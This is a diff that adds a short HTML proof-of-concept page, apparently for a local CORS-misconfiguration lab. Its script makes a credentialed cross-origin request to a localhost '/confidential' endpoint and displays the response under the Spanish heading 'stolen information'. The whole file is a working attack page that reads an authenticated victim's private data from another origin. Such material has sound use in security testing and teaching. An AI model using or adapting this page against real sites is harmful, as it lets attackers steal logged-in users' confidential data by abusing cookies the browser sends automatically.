@@ -1,0 +1,16 @@
+<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('GET', 'http://localhost:5000/confidential', true);
+  req.withCredentials = true;
+  req.send();
+
+  function reqListener() {
+    document.getElementById("stoleInfo").innerHTML = req.responseText;
+  }
+</script>
+
+<br>
+<center><h1> INFORMACION ROBADA </h1></center>
+
+<p id="stoleInfo"></p>
